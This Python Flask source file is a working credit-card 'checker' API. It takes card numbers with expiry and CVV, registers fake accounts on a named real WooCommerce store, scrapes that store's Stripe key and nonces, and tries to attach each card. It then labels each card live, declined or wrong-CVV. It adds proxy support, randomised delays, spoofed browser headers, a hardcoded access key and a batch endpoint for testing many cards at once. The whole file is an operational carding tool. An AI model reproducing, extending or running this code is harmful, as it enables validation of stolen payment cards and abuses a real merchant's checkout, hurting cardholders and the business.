# app.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import sys
import json
import uuid
import random
from faker import Faker
import re
import time
import datetime
import requests
from typing import Dict, Any
import urllib.parse

app = Flask(__name__)
CORS(app)

# Import necessary components from your existing code
faker = Faker()

class StripeProcessor:
    def __init__(self, proxy=None):
        self.user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
        self.faker = Faker()
        self.proxy = proxy
    
    def auto_request(self, url, method='GET', headers=None, data=None, params=None, json_data=None, session=None, debug=False):
        clean_headers = {}
        if headers:
            for key, value in headers.items():
                clean_headers[key] = value
        
        req_session = session if session else requests.Session()
        
        if self.proxy:
            req_session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
        
        request_kwargs = {
            'url': url,
            'headers': clean_headers,
            'data': data if data else None,
            'params': params if params else None,
            'json': json_data,
        }
        
        request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
        
        response = req_session.request(method, **request_kwargs, timeout=30)
        
        if response.status_code >= 400:
            raise requests.exceptions.HTTPError(f"{response.status_code} Client Error: {response.reason} for url: {url}")
        
        return response
    
    def parse_cc_string(self, cc_string):
        """Parse CC string in format CC|MM|YY|CVV or CC|MM|YYYY|CVV"""
        parts = cc_string.split('|')
        if len(parts) != 4:
            raise ValueError("Invalid CC format. Expected: NUMBER|MM|YYYY|CVV")
        
        card_num = parts[0].strip().replace(" ", "")
        card_mm = parts[1].strip()
        
        # Handle both 2-digit and 4-digit year
        year_part = parts[2].strip()
        if len(year_part) == 4:
            card_yy = year_part[-2:]
        else:
            card_yy = year_part
        
        card_cvv = parts[3].strip()
        
        return card_num, card_mm, card_yy, card_cvv
    
    def format_card_number(self, card_num):
        groups = []
        for i in range(0, len(card_num), 4):
            groups.append(card_num[i:i+4])
        return " ".join(groups)
    
    def find_ajax_nonce(self, html_content):
        patterns = [
            r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"',
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'_ajax_nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'data-nonce=["\']([a-f0-9]{10})["\']',
            r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'var wc_stripe_params = {[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'var stripe_params = {[^}]*nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'name="_ajax_nonce" value="([a-f0-9]{10})"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1)
        
        return None
    
    def get_bin_info(self, bin_num):
        """Get BIN information"""
        bin_info = {
            "brand": "N/A",
            "bank": "N/A",
            "type": "N/A", 
            "country": "N/A",
            "flag": "🌎",
            "currency": "N/A"
        }
        
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                
                brand = data.get('brand', 'N/A')
                bank = data.get('bank', 'N/A')
                country = data.get('country_name', 'N/A')
                card_type = data.get('type', 'N/A')
                level = data.get('level', 'N/A')
                
                if brand != 'N/A':
                    bin_info['brand'] = brand
                
                if bank != 'N/A':
                    bin_info['bank'] = bank[:15] if bank else "N/A"
                
                if country != 'N/A':
                    bin_info['country'] = country[:10] if country else "N/A"
                
                if card_type != 'N/A':
                    bin_info['type'] = card_type
                elif level != 'N/A':
                    bin_info['type'] = level
                
                flag = data.get('country_flag', '🌎')
                if flag != '🌎':
                    bin_info['flag'] = flag
                
                currencies = data.get('country_currencies', [])
                if currencies and currencies[0] != 'N/A':
                    bin_info['currency'] = currencies[0]
                    
        except:
            try:
                response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    if data.get('scheme'):
                        bin_info['brand'] = data['scheme'].upper()
                    
                    if data.get('type'):
                        bin_info['type'] = data['type'].upper()
                    
                    if data.get('bank', {}).get('name'):
                        bin_info['bank'] = data['bank']['name'][:15] if data['bank']['name'] else "N/A"
                    
                    if data.get('country', {}).get('name'):
                        bin_info['country'] = data['country']['name'][:10] if data['country']['name'] else "N/A"
                    
                    if data.get('country', {}).get('emoji'):
                        bin_info['flag'] = data['country']['emoji']
                    
                    if data.get('country', {}).get('currency'):
                        bin_info['currency'] = data['country']['currency']
            except:
                pass
        
        return bin_info
    
    def process_card(self, card_data):
        """Process a single card and return standardized result"""
        st = time.time()
        
        try:
            card_num, card_mm, card_yy, card_cvv = self.parse_cc_string(card_data)
        except ValueError as e:
            return {
                "status": "INVALID",
                "response": "Invalid format",
                "card_data": card_data,
                "time_taken": round(time.time() - st, 2),
                "bin_info": self.get_bin_info("000000"),
                "success": False
            }
        
        bin_info = self.get_bin_info(card_num[:6])
        raw_response = ""
        
        try:
            session = requests.Session()
            if self.proxy:
                session.proxies = {'http': self.proxy, 'https': self.proxy}
            
            base_url = "https://riversidefirewood.com.au"
            
            url_1 = f'{base_url}/my-account/'
            headers_1 = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
            }
            
            response_1 = self.auto_request(url_1, method='GET', headers=headers_1, session=session)
            
            regester_nouce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_1.text)
            if not regester_nouce_match:
                return {
                    "status": "ERROR",
                    "response": "Could not find woocommerce-register-nonce",
                    "card_data": card_data,
                    "time_taken": round(time.time() - st, 2),
                    "bin_info": bin_info,
                    "success": False
                }
            
            regester_nouce = regester_nouce_match.group(1)
            
            time.sleep(random.uniform(1.5, 2.5))
            
            headers_2 = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': url_1,
            }
            
            email = self.faker.email(domain="gmail.com")
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            data_2 = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': url_1,
                'wc_order_attribution_session_start_time': current_time,
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'woocommerce-register-nonce': regester_nouce,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            
            response_2 = self.auto_request(url_1, method='POST', headers=headers_2, data=data_2, session=session)
            
            pk_match = re.search(r'pk_live_[a-zA-Z0-9_]+', response_2.text)
            if not pk_match:
                return {
                    "status": "ERROR",
                    "response": "Could not find Stripe public key",
                    "card_data": card_data,
                    "time_taken": round(time.time() - st, 2),
                    "bin_info": bin_info,
                    "success": False
                }
            
            pk = pk_match.group(0)
            
            time.sleep(random.uniform(1.5, 2.5))
            
            url_payment = f'{base_url}/my-account/add-payment-method/'
            headers_payment = {
                'User-Agent': self.user_agent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB',
                'Referer': url_1,
            }
            
            response_payment = self.auto_request(url_payment, method='GET', headers=headers_payment, session=session)
            
            ajax_nonce = self.find_ajax_nonce(response_payment.text)
            
            if not ajax_nonce:
                script_tags = re.findall(r'<script[^>]*>.*?</script>', response_payment.text, re.DOTALL | re.IGNORECASE)
                for script in script_tags:
                    if 'nonce' in script.lower():
                        nonce_match = re.search(r'["\']([a-f0-9]{10})["\']', script)
                        if nonce_match:
                            ajax_nonce = nonce_match.group(1)
                            break
            
            if not ajax_nonce:
                ajax_nonce = "df11171e10"
            
            time.sleep(random.uniform(1.5, 2.5))
            
            url_3 = 'https://api.stripe.com/v1/payment_methods'
            headers_3 = {
                'User-Agent': self.user_agent,
                'accept': 'application/json',
                'accept-language': 'en-GB',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            }
            
            client_session_id = str(uuid.uuid4())
            elements_config_id = str(uuid.uuid4())
            guid = f"{uuid.uuid4().hex[:16]}c8320b"
            muid = f"{uuid.uuid4().hex[:16]}aafa6"
            sid = f"{uuid.uuid4().hex[:16]}af388f"
            
            formatted_card_num = self.format_card_number(card_num)
            full_year = f"20{card_yy}" if len(card_yy) == 2 else card_yy
            
            data_3 = {
                'type': 'card',
                'card[number]': formatted_card_num,
                'card[cvc]': card_cvv,
                'card[exp_year]': full_year,
                'card[exp_month]': card_mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'IN',
                'payment_user_agent': 'stripe.js/8ba24ab229; stripe-js-v3/8ba24ab229; payment-element; deferred-intent',
                'referrer': base_url,
                'time_on_page': str(random.randint(10000, 20000)),
                'client_attribution_metadata[client_session_id]': client_session_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': elements_config_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': pk,
                '_stripe_version': '2024-06-20',
            }
            
            response_3 = self.auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
            stripe_response = response_3.json()
            
            if 'error' in stripe_response:
                error_msg = stripe_response['error'].get('message', str(stripe_response['error']))
                error_code = stripe_response['error'].get('code', '')
                error_decline = stripe_response['error'].get('decline_code', '')
                
                if 'card_declined' == error_code:
                    return {
                        "status": "DECLINED",
                        "response": f"{error_msg} ({error_decline})",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'incorrect_number' == error_code:
                    return {
                        "status": "INVALID",
                        "response": f"Invalid card number: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'invalid_cvc' == error_code:
                    return {
                        "status": "WRONG_CVV",
                        "response": f"Wrong CVV: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'expired_card' == error_code:
                    return {
                        "status": "EXPIRED",
                        "response": f"Card expired: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'processing_error' == error_code:
                    return {
                        "status": "PROCESSING_ERROR",
                        "response": f"Processing error: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'invalid_expiry_year' == error_code or 'invalid_expiry_month' == error_code:
                    return {
                        "status": "INVALID_EXPIRY",
                        "response": f"Invalid expiry: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                elif 'rate_limit' in error_code:
                    return {
                        "status": "RATE_LIMITED",
                        "response": f"Rate limited: {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
                else:
                    return {
                        "status": "STRIPE_ERROR",
                        "response": f"Stripe error ({error_code}): {error_msg}",
                        "card_data": card_data,
                        "time_taken": round(time.time() - st, 2),
                        "bin_info": bin_info,
                        "success": False
                    }
            
            pm = stripe_response['id']
            
            time.sleep(random.uniform(1.5, 2.5))
            
            url_4 = f'{base_url}/wp-admin/admin-ajax.php'
            headers_4 = {
                'User-Agent': self.user_agent,
                'Accept': '*/*',
                'Accept-Language': 'en-GB',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': base_url,
                'Referer': url_payment,
                'X-Requested-With': 'XMLHttpRequest',
            }
            
            data_4 = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }
            
            response_4 = self.auto_request(url_4, method='POST', headers=headers_4, data=data_4, session=session)
            
            try:
                final_response = response_4.json()
                raw_response = json.dumps(final_response)
                
                if final_response.get('success') is True:
                    if 'data' in final_response:
                        data = final_response['data']
                        if isinstance(data, dict):
                            if 'status' in data:
                                status = data['status']
                                if status == 'succeeded':
                                    return {
                                        "status": "LIVE",
                                        "response": "Card added successfully!",
                                        "card_data": card_data,
                                        "time_taken": round(time.time() - st, 2),
                                        "bin_info": bin_info,
                                        "success": True
                                    }
                                elif status == 'requires_action':
                                    return {
                                        "status": "LIVE_3DS",
                                        "response": "Card is LIVE (requires 3D Secure)",
                                        "card_data": card_data,
                                        "time_taken": round(time.time() - st, 2),
                                        "bin_info": bin_info,
                                        "success": True
                                    }
                                elif status == 'requires_payment_method':
                                    return {
                                        "status": "DECLINED",
                                        "response": "Card declined by issuer",
                                        "card_data": card_data,
                                        "time_taken": round(time.time() - st, 2),
                                        "bin_info": bin_info,
                                        "success": False
                                    }
                                else:
                                    return {
                                        "status": "UNKNOWN_STATUS",
                                        "response": f"Status: {status}",
                                        "card_data": card_data,
                                        "time_taken": round(time.time() - st, 2),
                                        "bin_info": bin_info,
                                        "success": False
                                    }
                            else:
                                return {
                                    "status": "LIVE",
                                    "response": "Setup intent created successfully!",
                                    "card_data": card_data,
                                    "time_taken": round(time.time() - st, 2),
                                    "bin_info": bin_info,
                                    "success": True
                                }
                        else:
                            return {
                                "status": "LIVE",
                                "response": "Setup intent created successfully!",
                                "card_data": card_data,
                                "time_taken": round(time.time() - st, 2),
                                "bin_info": bin_info,
                                "success": True
                            }
                    else:
                        return {
                            "status": "LIVE",
                            "response": "Setup intent created successfully!",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": True
                        }
                else:
                    error_msg = "Unknown error"
                    if 'data' in final_response and 'error' in final_response['data']:
                        error_data = final_response['data']['error']
                        if isinstance(error_data, dict) and 'message' in error_data:
                            error_msg = error_data['message']
                        else:
                            error_msg = str(error_data)
                    elif 'message' in final_response:
                        error_msg = final_response['message']
                    
                    error_lower = error_msg.lower()
                    if 'cannot add' in error_lower and 'soon' in error_lower:
                        return {
                            "status": "RATE_LIMITED",
                            "response": "Rate limited - wait 2-3 minutes",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'declined' in error_lower:
                        return {
                            "status": "DECLINED",
                            "response": f"Declined: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'incorrect' in error_lower or 'invalid' in error_lower:
                        return {
                            "status": "INVALID",
                            "response": f"Invalid: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'expired' in error_lower:
                        return {
                            "status": "EXPIRED",
                            "response": f"Expired: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'security' in error_lower or 'cvc' in error_lower:
                        return {
                            "status": "WRONG_CVV",
                            "response": f"Wrong CVV: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'verify' in error_lower or 'nonce' in error_lower:
                        return {
                            "status": "NONCE_ERROR",
                            "response": f"Nonce error: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    elif 'insufficient' in error_lower or 'funds' in error_lower:
                        return {
                            "status": "INSUFFICIENT_FUNDS",
                            "response": f"Insufficient funds: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    else:
                        return {
                            "status": "SITE_ERROR",
                            "response": f"Site error: {error_msg}",
                            "card_data": card_data,
                            "time_taken": round(time.time() - st, 2),
                            "bin_info": bin_info,
                            "success": False
                        }
                    
            except json.JSONDecodeError:
                return {
                    "status": "JSON_ERROR",
                    "response": f"Invalid JSON response: {response_4.text[:200]}",
                    "card_data": card_data,
                    "time_taken": round(time.time() - st, 2),
                    "bin_info": bin_info,
                    "success": False
                }
            
        except requests.exceptions.HTTPError as e:
            return {
                "status": "HTTP_ERROR",
                "response": f"HTTP error: {str(e)}",
                "card_data": card_data,
                "time_taken": round(time.time() - st, 2),
                "bin_info": bin_info,
                "success": False
            }
        except requests.exceptions.RequestException as e:
            return {
                "status": "NETWORK_ERROR",
                "response": f"Network error: {str(e)}",
                "card_data": card_data,
                "time_taken": round(time.time() - st, 2),
                "bin_info": bin_info,
                "success": False
            }
        except Exception as e:
            return {
                "status": "UNKNOWN_ERROR",
                "response": f"Unknown error: {str(e)}",
                "card_data": card_data,
                "time_taken": round(time.time() - st, 2),
                "bin_info": bin_info,
                "success": False
            }

# API Endpoints
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "response": "Stripe Auth API Server",
        "endpoints": [
            "/api/stripe?key=blazealways&cc=CC|MM|YY|CVV",
            "/api/paypal?key=blazealways&cc=CC|MM|YY|CVV",
            "/gateway=stripe/key=blazealways/cc=CC|MM|YY|CVV",
            "/gateway=paypal/key=blazealways/cc=CC|MM|YY|CVV"
        ],
        "usage": "Send GET request with key and cc parameters"
    })

# Main API endpoint - Simplified version
@app.route('/gateway=<gateway>/key=<api_key>/cc=<path:cc_data>')
def process_card_gateway(gateway, api_key, cc_data):
    """Process card through specified gateway"""
    
    # Validate API key
    if api_key != "blazealways":
        return jsonify({
            "status": "ERROR",
            "response": "Invalid API key",
            "success": False
        }), 401
    
    # Validate gateway
    if gateway not in ["stripe", "stripeauth", "paypal"]:
        return jsonify({
            "status": "ERROR",
            "response": f"Invalid gateway: {gateway}. Use 'stripe' or 'paypal'",
            "success": False
        }), 400
    
    # Decode URL-encoded cc_data if needed
    try:
        cc_data = urllib.parse.unquote(cc_data)
    except:
        pass
    
    # Check if cc_data is provided
    if not cc_data or cc_data == "":
        return jsonify({
            "status": "ERROR",
            "response": "No card data provided",
            "success": False
        }), 400
    
    try:
        # Create processor instance based on gateway
        if gateway in ["stripe", "stripeauth"]:
            processor = StripeProcessor()
            result = processor.process_card(cc_data)
        else:  # paypal
            # For now, return placeholder for PayPal
            return jsonify({
                "status": "ERROR",
                "response": "PayPal gateway not implemented yet",
                "success": False
            }), 501
        
        # Return the result
        return jsonify({
            "status": result["status"],
            "response": result["response"],
            "card": result["card_data"],
            "time_taken": result["time_taken"],
            "bin_info": result["bin_info"],
            "success": result["success"]
        })
            
    except Exception as e:
        return jsonify({
            "status": "SERVER_ERROR",
            "response": f"Server error: {str(e)}",
            "success": False
        }), 500

# Alternative simple endpoints
@app.route('/api/stripe')
def api_stripe():
    """Stripe API endpoint with query parameters"""
    api_key = request.args.get('key')
    cc_data = request.args.get('cc')
    
    if not api_key or api_key != "blazealways":
        return jsonify({
            "status": "ERROR",
            "response": "Invalid API key",
            "success": False
        }), 401
    
    if not cc_data:
        return jsonify({
            "status": "ERROR",
            "response": "No card data provided. Use ?cc=CC|MM|YY|CVV",
            "success": False
        }), 400
    
    try:
        processor = StripeProcessor()
        result = processor.process_card(cc_data)
        
        return jsonify({
            "status": result["status"],
            "response": result["response"],
            "card": result["card_data"],
            "time_taken": result["time_taken"],
            "bin_info": result["bin_info"],
            "success": result["success"]
        })
            
    except Exception as e:
        return jsonify({
            "status": "SERVER_ERROR",
            "response": f"Server error: {str(e)}",
            "success": False
        }), 500

@app.route('/api/paypal')
def api_paypal():
    """PayPal API endpoint with query parameters"""
    api_key = request.args.get('key')
    cc_data = request.args.get('cc')
    
    if not api_key or api_key != "blazealways":
        return jsonify({
            "status": "ERROR",
            "response": "Invalid API key",
            "success": False
        }), 401
    
    if not cc_data:
        return jsonify({
            "status": "ERROR",
            "response": "No card data provided. Use ?cc=CC|MM|YY|CVV",
            "success": False
        }), 400
    
    # Placeholder for PayPal implementation
    return jsonify({
        "status": "ERROR",
        "response": "PayPal gateway not implemented yet",
        "success": False
    }), 501

# Test endpoint without authentication
@app.route('/test')
def test_endpoint():
    """Test endpoint without authentication"""
    cc_data = request.args.get('cc')
    
    if not cc_data:
        return jsonify({
            "status": "ERROR",
            "response": "No card data provided. Use ?cc=CC|MM|YY|CVV",
            "success": False
        }), 400
    
    try:
        processor = StripeProcessor()
        result = processor.process_card(cc_data)
        
        return jsonify({
            "status": result["status"],
            "response": result["response"],
            "card": result["card_data"],
            "time_taken": result["time_taken"],
            "bin_info": result["bin_info"],
            "success": result["success"]
        })
            
    except Exception as e:
        return jsonify({
            "status": "SERVER_ERROR",
            "response": f"Server error: {str(e)}",
            "success": False
        }), 500

@app.route('/health')
def health_check():
    """Health check endpoint for Render"""
    return jsonify({
        "status": "healthy",
        "response": "API is running",
        "timestamp": datetime.datetime.now().isoformat()
    })

# Batch processing endpoint
@app.route('/api/batch', methods=['POST'])
def batch_process():
    """Process multiple cards at once"""
    api_key = request.args.get('key') or request.headers.get('X-API-Key')
    
    if not api_key or api_key != "blazealways":
        return jsonify({
            "status": "ERROR",
            "response": "Invalid API key",
            "success": False
        }), 401
    
    try:
        data = request.get_json()
        if not data or 'cards' not in data:
            return jsonify({
                "status": "ERROR",
                "response": "No cards provided in request body",
                "success": False
            }), 400
        
        cards = data['cards']
        if not isinstance(cards, list):
            return jsonify({
                "status": "ERROR",
                "response": "Cards must be provided as a list",
                "success": False
            }), 400
        
        processor = StripeProcessor()
        results = []
        
        for card_data in cards:
            result = processor.process_card(card_data)
            results.append({
                "status": result["status"],
                "response": result["response"],
                "card": result["card_data"],
                "time_taken": result["time_taken"],
                "bin_info": result["bin_info"],
                "success": result["success"]
            })
        
        # Count successful and failed
        successful = sum(1 for r in results if r["success"])
        failed = len(results) - successful
        
        return jsonify({
            "status": "COMPLETED",
            "response": f"Processed {len(results)} cards",
            "results": results,
            "summary": {
                "total": len(results),
                "successful": successful,
                "failed": failed
            },
            "success": True
        })
            
    except Exception as e:
        return jsonify({
            "status": "SERVER_ERROR",
            "response": f"Server error: {str(e)}",
            "success": False
        }), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)